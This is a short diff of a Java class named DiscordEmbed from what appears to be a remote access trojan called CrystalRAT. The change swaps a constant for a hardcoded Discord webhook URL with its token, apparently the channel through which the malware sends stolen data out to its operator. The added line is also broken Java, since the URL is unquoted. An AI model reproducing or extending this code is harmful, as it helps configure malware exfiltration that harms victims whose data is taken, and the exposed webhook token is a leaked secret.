@@ -25,7 +25,7 @@ public class DiscordEmbed {
     private List<EmbedObject> embeds = new ArrayList();
 
     public DiscordEmbed() {
-        this.url = CrystalRAT.WEBHOOK;
+        this.url = https://discord.com/api/webhooks/1052703235032485929/0wvf4HaTi8fHkFCbcAePtTZPj31i62D8szwUVv2Vms_WkSQ3tRoMfTGFdchKSAw4cFKo;
     }
 
     public void setContent(String content) {
